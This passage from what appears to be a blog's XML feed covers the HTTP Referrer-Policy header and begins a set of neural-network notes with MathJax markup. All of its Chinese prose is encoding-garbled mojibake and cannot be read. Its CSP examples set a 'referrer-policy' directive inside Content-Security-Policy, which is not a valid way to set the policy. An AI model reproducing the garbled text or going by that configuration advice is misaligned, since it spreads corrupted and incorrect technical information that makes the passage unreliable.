<code>HTTPS</code>ï¼‰ï¼Œä¼šå‘é€å®Œæ•´çš„æ¥æº <code>URL</code>ã€‚è¿™ä¸ªç­–ç•¥æ—¨åœ¨é˜²æ­¢ <code>HTTPS</code> é¡µé¢ä¸Šçš„æ•æ„Ÿä¿¡æ¯é€šè¿‡ä¸å®‰å…¨çš„ <code>HTTP</code> è¿æ¥æ³„éœ²ã€‚</li><li><strong><code>same-origin</code>:</strong> åªæœ‰å½“ç›®æ ‡ç½‘ç«™ä¸å½“å‰ç½‘ç«™å…·æœ‰ç›¸åŒçš„æºï¼ˆåè®®ã€åŸŸåå’Œç«¯å£éƒ½ç›¸åŒï¼‰æ—¶ï¼Œæ‰ä¼šå‘é€å®Œæ•´çš„ <code>Referer</code> å¤´éƒ¨ã€‚å¯¹äºè·¨åŸŸè¯·æ±‚ï¼Œä¸ä¼šå‘é€ <code>Referer</code> å¤´éƒ¨ã€‚</li><li><strong><code>origin</code>:</strong> åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œéƒ½ä¼šå‘é€æ¥æºçš„åè®®å’Œä¸»æœºåï¼ˆä¸åŒ…å«è·¯å¾„å’ŒæŸ¥è¯¢å­—ç¬¦ä¸²ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå½“å‰é¡µé¢æ˜¯ <code>https://example.com/page.html</code>ï¼Œé‚£ä¹ˆ <code>Referer</code> å¤´éƒ¨çš„å€¼å°†æ˜¯ <code>https://example.com/</code>ã€‚</li><li><strong><code>strict-origin</code>:</strong> ä¸ <code>origin</code> ç±»ä¼¼ï¼Œä½†åœ¨ä» HTTPS é¡µé¢å¯¼èˆªåˆ° HTTP é¡µé¢æ—¶ï¼Œä¸ä¼šå‘é€ <code>Referer</code> å¤´éƒ¨ã€‚</li><li><strong><code>origin-when-cross-origin</code>:</strong> å¯¹äºåŒæºè¯·æ±‚ï¼Œå‘é€å®Œæ•´çš„ <code>Referer</code> å¤´éƒ¨ã€‚å¯¹äºè·¨åŸŸè¯·æ±‚ï¼Œåªå‘é€æ¥æºçš„åè®®å’Œä¸»æœºåã€‚</li><li><strong><code>strict-origin-when-cross-origin</code>:</strong> å¯¹äºåŒæºè¯·æ±‚ï¼Œå‘é€å®Œæ•´çš„ <code>Referer</code> å¤´éƒ¨ã€‚å¯¹äºè·¨åŸŸè¯·æ±‚ï¼Œåªå‘é€æ¥æºçš„åè®®å’Œä¸»æœºåã€‚å¹¶ä¸”åœ¨ä» HTTPS é¡µé¢å¯¼èˆªåˆ° HTTP é¡µé¢æ—¶ï¼Œä¸ä¼šå‘é€ <code>Referer</code> å¤´éƒ¨ã€‚</li><li><strong><code>unsafe-url</code>:</strong> è¿™æ˜¯æœ€å®½æ¾çš„ç­–ç•¥ã€‚æ— è®ºåœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œéƒ½ä¼šå‘é€å®Œæ•´çš„ <code>Referer</code> å¤´éƒ¨ï¼ŒåŒ…æ‹¬åè®®ã€ä¸»æœºåã€è·¯å¾„å’ŒæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚<strong>å¼ºçƒˆå»ºè®®é¿å…ä½¿ç”¨æ­¤ç­–ç•¥</strong>ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šæš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚</li></ul><h3 id="å¦‚ä½•è®¾ç½®-referrer-policyï¼Ÿ">å¦‚ä½•è®¾ç½® <code>referrer-policy</code>ï¼Ÿ</h3><p>è®¾ç½® <code>referrer-policy</code> æœ‰å‡ ç§æ–¹å¼ï¼š</p><ol><li><strong>HTTP å¤´éƒ¨:</strong> è¿™æ˜¯æœ€å¸¸ç”¨å’Œæ¨èçš„æ–¹å¼ã€‚æœåŠ¡å™¨åœ¨ HTTP å“åº”å¤´ä¸­æ·»åŠ  <code>Referrer-Policy</code> å­—æ®µå¹¶è®¾ç½®ç›¸åº”çš„å€¼ã€‚ä¾‹å¦‚ï¼š</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referrer-Policy</span><span class="punctuation">: </span>strict-origin-when-cross-origin</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>HTML <code>&lt;meta&gt;</code> æ ‡ç­¾:</strong> åœ¨ HTML æ–‡æ¡£çš„ <code>&lt;head&gt;</code> éƒ¨åˆ†ä½¿ç”¨ <code>&lt;meta&gt;</code> æ ‡ç­¾è®¾ç½® <code>referrer-policy</code>ï¼š</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;strict-origin-when-cross-origin&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>HTML å…ƒç´ çš„ <code>referrerpolicy</code> å±æ€§:</strong> ä¸ºç‰¹å®šçš„ <code>&lt;a&gt;</code>, <code>&lt;area&gt;</code>, å’Œ <code>&lt;form&gt;</code> å…ƒç´ è®¾ç½® <code>referrerpolicy</code> å±æ€§ï¼Œè¦†ç›–å…¨å±€è®¾ç½®ï¼š</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">referrerpolicy</span>=<span class="string">&quot;origin&quot;</span>&gt;</span>Visit Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://anothersite.com&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">referrerpolicy</span>=<span class="string">&quot;no-referrer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>åœ¨<code> AJAX</code> ä¸­é…ç½® <code>referrer-policy</code>:</strong>  å¯¹äºé€šè¿‡ <code>JavaScript</code> å‘èµ·çš„ <code>AJAX</code> è¯·æ±‚ï¼š</li></ol><ul><li><p><strong>ä½¿ç”¨ <code>fetch</code> API:</strong> åœ¨ <code>fetch</code> è¯·æ±‚çš„é…ç½®å¯¹è±¡ä¸­ï¼Œä½¿ç”¨ <code>referrerPolicy</code> é€‰é¡¹è®¾ç½®ç‰¹å®šçš„ç­–ç•¥ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/data&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="attr">referrerPolicy</span>: <span class="string">&#x27;origin-when-cross-origin&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>æ­¤è®¾ç½®ä¼šè¦†ç›–å…¨å±€çš„ <code>referrer-policy</code>ã€‚</p></li><li><p><strong>ä½¿ç”¨ <code>XMLHttpRequest</code>:</strong> <code>XMLHttpRequest</code> æœ¬èº«æ²¡æœ‰ç›´æ¥çš„ <code>referrerPolicy</code> å±æ€§ã€‚ä½ éœ€è¦ä¾èµ–å…¨å±€çš„ <code>referrer-policy</code> è®¾ç½®ï¼ˆHTTP å¤´éƒ¨æˆ– <code>&lt;meta&gt;</code> æ ‡ç­¾ï¼‰ã€‚</p></li></ul><ol start="5"><li><strong>åœ¨å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) ä¸­é…ç½® <code>referrer-policy</code>:</strong></li></ol><p><code>referrer-policy</code> å¯ä»¥ä½œä¸º CSP æŒ‡ä»¤çš„ä¸€éƒ¨åˆ†åœ¨ HTTP å“åº”å¤´æˆ– HTML <code>&lt;meta&gt;</code> æ ‡ç­¾ä¸­è®¾ç½®ã€‚</p><ul><li><strong>HTTP å¤´éƒ¨ä¸­çš„ CSP:</strong></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>referrer-policy origin-when-cross-origin</span><br></pre></td></tr></table></figure><ul><li><strong>HTML <code>&lt;meta&gt;</code> æ ‡ç­¾ä¸­çš„ CSP:</strong></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;referrer-policy origin-when-cross-origin&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>CSP</code> ä¸­è®¾ç½® <code>referrer-policy</code> ä¼šå¼ºåˆ¶æ•´ä¸ªæ–‡æ¡£åŠå…¶å‘èµ·çš„è¯·æ±‚éµå¾ªè¯¥ç­–ç•¥ï¼Œä½†ä¼šè¢«æ›´å…·ä½“çš„è®¾ç½®ï¼ˆå¦‚ <code>fetch</code> API ä¸­çš„ <code>referrerPolicy</code> æˆ– HTML å…ƒç´ çš„ <code>referrerpolicy</code> å±æ€§ï¼‰è¦†ç›–ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡æ¯æ³„éœ² </tag>
            
            <tag> Referer-Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¥ç»ç½‘ç»œç¬”è®°</title>
      <link href="/2025/05/02/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/05/02/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¥ç»ç½‘ç»œ-Neural-Networks">ç¥ç»ç½‘ç»œ(Neural Networks)</h2><p>ç¥ç»ç½‘ç»œï¼ˆNeural Networkï¼‰æ˜¯ä¸€ç§æ¨¡ä»¿äººç±»å¤§è„‘ç¥ç»å…ƒç»“æ„å’Œå·¥ä½œæ–¹å¼çš„è®¡ç®—æ¨¡å‹ï¼Œå¹¿æ³›ç”¨äºæœºå™¨å­¦ä¹ å’Œäººå·¥æ™ºèƒ½ä¸­ï¼Œå°¤å…¶æ“…é•¿å¤„ç†å›¾åƒè¯†åˆ«ã€è¯­éŸ³è¯†åˆ«ã€è‡ªç„¶è¯­è¨€å¤„ç†ç­‰å¤æ‚ä»»åŠ¡ã€‚</p><p><strong>é€šä¿—ç†è§£ï¼š</strong></p><p>å¯ä»¥æŠŠç¥ç»ç½‘ç»œçœ‹æˆæ˜¯ä¸€ç§&quot;é»‘ç›’å­&quot;ç³»ç»Ÿï¼Œå®ƒé€šè¿‡è¾“å…¥ä¸€äº›æ•°æ®ï¼Œä¸æ–­å­¦ä¹ å…¶ä¸­çš„è§„å¾‹ï¼Œå¹¶ç»™å‡ºç›¸åº”çš„è¾“å‡ºç»“æœã€‚å°±åƒäººç±»é€šè¿‡ç»éªŒä¸æ–­å­¦ä¹ å’Œæ”¹è¿›ä¸€æ ·ï¼Œç¥ç»ç½‘ç»œä¹Ÿé€šè¿‡å¤§é‡çš„æ•°æ®è®­ç»ƒè‡ªå·±ã€‚</p><h3 id="ç»„æˆç»“æ„">ç»„æˆç»“æ„</h3><p>ç¥ç»ç½‘ç»œé€šå¸¸ç”±ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p><ol><li><strong>è¾“å…¥å±‚ï¼ˆInput Layerï¼‰</strong>ï¼šæ¥æ”¶åŸå§‹æ•°æ®ï¼Œæ¯”å¦‚å›¾ç‰‡çš„åƒç´ å€¼æˆ–æ–‡æœ¬çš„å‘é‡è¡¨ç¤ºã€‚</li><li><strong>éšè—å±‚ï¼ˆHidden Layersï¼‰</strong>ï¼šä¸­é—´è‹¥å¹²å±‚ç¥ç»å…ƒèŠ‚ç‚¹ï¼Œæ¯ä¸€å±‚éƒ½ä¼šå¯¹æ•°æ®è¿›è¡Œå¤„ç†å’Œç‰¹å¾æå–ã€‚</li><li><strong>è¾“å‡ºå±‚ï¼ˆOutput Layerï¼‰</strong>ï¼šè¾“å‡ºæœ€ç»ˆç»“æœï¼Œæ¯”å¦‚åˆ†ç±»æ ‡ç­¾æˆ–é¢„æµ‹æ•°å€¼ã€‚</li></ol><p>æ¯ä¸€å±‚éƒ½åŒ…å«å¤šä¸ªâ€œç¥ç»å…ƒâ€ï¼Œå®ƒä»¬é€šè¿‡**æƒé‡ï¼ˆweightï¼‰<strong>å’Œ</strong>åç½®ï¼ˆbiasï¼‰<strong>è¿æ¥ï¼Œå¹¶ç»è¿‡ä¸€ä¸ª</strong>æ¿€æ´»å‡½æ•°ï¼ˆactivation functionï¼‰**è¿›è¡Œéçº¿æ€§å˜æ¢ã€‚</p><p><strong>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼š</strong></p><p>æ¯”å¦‚ä½ è¦è®­ç»ƒä¸€ä¸ªç¥ç»ç½‘ç»œæ¥è¯†åˆ«çŒ«å’Œç‹—çš„å›¾ç‰‡ï¼š</p><ul><li>è¾“å…¥å±‚ï¼šæ¥æ”¶å›¾ç‰‡çš„åƒç´ æ•°æ®ã€‚</li><li>éšè—å±‚ï¼šæå–ç‰¹å¾ï¼Œæ¯”å¦‚è€³æœµå½¢çŠ¶ã€æ¯›å‘é¢œè‰²ã€çœ¼ç›ä½ç½®ç­‰ã€‚</li><li>è¾“å‡ºå±‚ï¼šç»™å‡ºç»“æœï¼Œä¾‹å¦‚â€œè¿™æ˜¯ä¸€åªçŒ«â€æˆ–â€œè¿™æ˜¯ä¸€åªç‹—â€ã€‚</li></ul><h3 id="å¸¸è§çš„ç®—æ³•">å¸¸è§çš„ç®—æ³•</h3><p>å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆ<code>Feedforward Neural Network, FNN</code>ï¼‰ã€å·ç§¯ç¥ç»ç½‘ç»œï¼ˆ<code>Convolutional Neural Network, CNN</code>ï¼‰ã€å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆ<code>Recurrent Neural Network, RNN</code>ï¼‰ã€ç”Ÿæˆå¯¹æŠ—ç½‘ç»œï¼ˆ<code>Generative Adversarial Network, GAN</code>ï¼‰ç­‰ã€‚</p><h4 id="å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆFNNï¼‰">å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆFNNï¼‰</h4><ul><li><strong>æè¿°</strong>ï¼šæœ€åŸºæœ¬çš„ç¥ç»ç½‘ç»œç»“æ„ï¼Œä¿¡æ¯ä»è¾“å…¥å±‚å•å‘æµå‘è¾“å‡ºå±‚ï¼Œæ²¡æœ‰å¾ªç¯ã€‚</li><li><strong>ç”¨é€”</strong>ï¼šå›¾åƒåˆ†ç±»ã€ç‰¹å¾æå–ã€å‡½æ•°æ‹Ÿåˆç­‰ã€‚</li><li><strong>æ ¸å¿ƒç®—æ³•</strong>ï¼šå‰å‘ä¼ æ’­ + åå‘ä¼ æ’­ï¼ˆBackpropagationï¼‰</li></ul><h4 id="å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰">å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰</h4><ul><li><strong>æè¿°</strong>ï¼šä¸“é—¨ç”¨äºå¤„ç†<strong>å›¾åƒ</strong>ç­‰å…·æœ‰ç©ºé—´ç»“æ„çš„æ•°æ®ï¼Œåˆ©ç”¨å·ç§¯å±‚æå–å±€éƒ¨ç‰¹å¾ã€‚</li><li><strong>ç»„æˆ</strong>ï¼šå·ç§¯å±‚ã€æ± åŒ–å±‚ã€å…¨è¿æ¥å±‚</li><li><strong>ç”¨é€”</strong>ï¼šå›¾åƒè¯†åˆ«ï¼ˆå¦‚äººè„¸è¯†åˆ«ã€ç‰©ä½“æ£€æµ‹ï¼‰ã€è§†é¢‘åˆ†æã€åŒ»ç–—å›¾åƒç­‰ã€‚</li><li><strong>ä»£è¡¨ç½‘ç»œ</strong>ï¼šLeNet, AlexNet, VGG, ResNet</li></ul><h4 id="å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰">å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰</h4><ul><li><strong>æè¿°</strong>ï¼šå…·æœ‰â€œè®°å¿†â€èƒ½åŠ›ï¼Œé€‚ç”¨äº<strong>åºåˆ—æ•°æ®</strong>ï¼Œé€šè¿‡éšè—çŠ¶æ€ä¼ é€’å‰ä¸€æ—¶åˆ»ä¿¡æ¯ã€‚</li><li><strong>ç”¨é€”</strong>ï¼šè‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰ã€æ—¶é—´åºåˆ—é¢„æµ‹ã€è¯­éŸ³è¯†åˆ«</li><li><strong>å˜ç§</strong>ï¼š<ul><li>LSTMï¼ˆLong Short-Term Memoryï¼‰</li><li>GRUï¼ˆGated Recurrent Unitï¼‰</li></ul></li></ul><h4 id="ç”Ÿæˆå¯¹æŠ—ç½‘ç»œï¼ˆGANï¼‰">ç”Ÿæˆå¯¹æŠ—ç½‘ç»œï¼ˆGANï¼‰</h4><ul><li><strong>æè¿°</strong>ï¼šç”±ç”Ÿæˆå™¨ï¼ˆGeneratorï¼‰å’Œåˆ¤åˆ«å™¨ï¼ˆDiscriminatorï¼‰ç»„æˆï¼Œè¿›è¡Œå¯¹æŠ—è®­ç»ƒã€‚</li><li><strong>ç”¨é€”</strong>ï¼šå›¾åƒç”Ÿæˆã€é£æ ¼è¿ç§»ã€æ•°æ®å¢å¼ºã€è¶…åˆ†è¾¨ç‡</li><li><strong>ä»£è¡¨ç®—æ³•</strong>ï¼šDCGANã€StyleGANã€CycleGAN</li></ul><h2 id="å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆFNNï¼‰-2">å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆFNNï¼‰</h2><p>å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆ<code>Feedforward Neural Network, FNN</code>ï¼‰æ˜¯ä¸€ç§<strong>äººå·¥ç¥ç»ç½‘ç»œ</strong>ï¼Œå…¶ä¸­<strong>ä¿¡æ¯å•å‘æµåŠ¨</strong>â€”â€”ä»è¾“å…¥å±‚æµå‘è¾“å‡ºå±‚ï¼Œä¸­é—´ç»è¿‡ä¸€ä¸ªæˆ–å¤šä¸ª<strong>éšè—å±‚</strong>ï¼Œ<strong>æ²¡æœ‰ç¯è·¯æˆ–åé¦ˆè¿æ¥</strong>ã€‚</p><h3 id="ç½‘ç»œç»“æ„ç»„æˆ">ç½‘ç»œç»“æ„ç»„æˆ</h3><p>ä¸€ä¸ªå…¸å‹çš„ FNN åŒ…æ‹¬ï¼š</p><ol><li><p><strong>è¾“å…¥å±‚</strong><br>æ¥æ”¶åŸå§‹ç‰¹å¾è¾“å…¥ï¼ˆå¦‚å›¾åƒåƒç´ ã€æ–‡æœ¬å‘é‡ã€æ•°å€¼ç‰¹å¾ç­‰ï¼‰</p></li><li><p><strong>éšè—å±‚ï¼ˆ1ä¸ªæˆ–å¤šä¸ªï¼‰</strong><br>æ¯å±‚åŒ…å«å¤šä¸ªç¥ç»å…ƒï¼Œæ‰§è¡Œçº¿æ€§åŠ æƒå’Œ + æ¿€æ´»å‡½æ•°</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="34.453ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 15228.3 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1429.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2485.4,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(4275.5,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1354,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1854,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6617.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(7617.5,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 